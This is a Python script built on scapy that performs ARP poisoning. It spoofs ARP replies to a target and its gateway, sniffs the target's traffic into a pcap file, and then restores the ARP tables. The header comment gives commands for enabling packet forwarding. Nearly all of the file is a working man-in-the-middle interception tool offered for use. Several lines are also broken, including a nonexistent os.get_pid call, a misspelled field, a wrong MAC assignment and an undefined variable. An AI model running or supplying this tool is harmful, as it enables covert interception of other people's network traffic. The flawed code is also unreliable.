'''
	Made By Sai Harsha Kottapalli
	Tested on python3
	About	: 	ARP poisoning
	Use	 	:	convince target and gateway to pass traffic through this.
	Note	:	need to notify localhost to forward packets (across gateway ip address and Target ip address)
				Kali: $echo 1 > /proc/sys/net/ipv4/ip_forward
				mac : $sudo sysctl -w net.inet.ip.forwarding=1
				Check with $arp -a
'''

import os
import sys
import signal
import argparse
from threading import *
from scapy.all import *


def tgt_restore(gate_ip, gate_mac, tgt_ip, tgt_mac):
	# send ARP packets with correct MAC address
	send(ARP(op=2, psrc=gate_ip, pdst=tgt_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=5)
	send(ARP(op=2, psrc=tgt_ip, pdst=gate_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=tgt_mac), count=5)

	#main thread exits
	os.kill(os.get_pid(), signal.SIGINT)

def get_mac(ip):
	#response after sending ARP request
	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)#send and receive

	# return MAC address from response
	for s, r in responses:
		return r[Ether].src
	return None

def tgt_poisoning(gate_ip, gate_mac, tgt_ip, tgt_mac):
	tgt_poisoning = ARP()
	tgt_poisoning.op = 2 # opcode 2 (reply)
	tgt_poisoning.psrc = gate_ip
	tgt_poisoning.pdst = tgt_ip
	tgt_poisoning.hwdst = tgt_mac

	gate_poison = ARP() #gateway poisoning
	gate_poison.op = 2
	gate_poison.psrc = tgt_ip
	gate_poison.psdt = gate_ip
	gate_poison.hwdst = tgt_mac

	print("[*]ARP Poisoning starting....")

	while True:
		try:
			send(tgt_poisoning)
			send(gate_poison)
			time.sleep(2)
		except KeyboardInterrupt:
			tgt_restore(gate_ip, gate_mac, tgt_ip, tgt_mac)
	print("[*]ARP poisoning done.")

def main():
	parser = argparse.ArgumentParser(description = "ARP poisoning")
	parser.add_argument("-i",action="store",dest="interface",help="interface")
	parser.add_argument("-ip",action="store",dest="ip",help="target ip address")
	parser.add_argument("-g",action="store",dest="gateway",help="gateway ip address")
	results = parser.parse_args()

	interface = results.interface
	tgt_ip = results.ip #target ip
	gate_ip = results.gateway #gateway ip
	
	if interface is None or tgt_ip is None or gate_ip is None:
		parser.print_help()
		exit(0)

	count_packets = 1000 # sniff these many packets

	print("[*]Setting {0} and {1}".format(interface,output))
	conf.iface = interface # set up the interface
	conf.verb = 0 # turn off output

	gate_mac = get_mac(gate_ip) # gateway's MAC address

	if gate_mac is not None:
		print("[*] Gateway {0} is at {1}".format(gate_ip, gate_mac))
	else:
		print("[-]Could not get Gateway MAC address. Exit..")
		sys.exit(0)

	tgt_mac = get_mac(tgt_ip)

	if tgt_mac is not None:
		print("[*]Target's ip : {0} and MAC : {1}".format(tgt_ip, tgt_mac))
	else:
		print("[-]Could not get Target MAC address. Exit..")

	#poisoning 
	t = Thread(target=tgt_poisoning, args=(gate_ip, gate_mac, tgt_ip, tgt_mac))
	t.start()

	try:
		print("[*]Packets to be sniffed : {0}".format(count_packets))

		bpf_filter = "ip host {0}".format(tgt_ip) #  packets from the target IP
		packets = sniff(count=count_packets, filter=bpf_filter, iface=interface)

		# write packets
		wrpcap("arper.pcap", packets)

		# restore network
		tgt_restore(gate_ip, gate_mac, tgt_ip, tgt_mac)

	except KeyboardInterrupt:
		# restore network
		tgt_restore(gate_ip, gate_mac, tgt_ip, tgt_mac)
		sys.exit(0)

if __name__ == "__main__":
	main()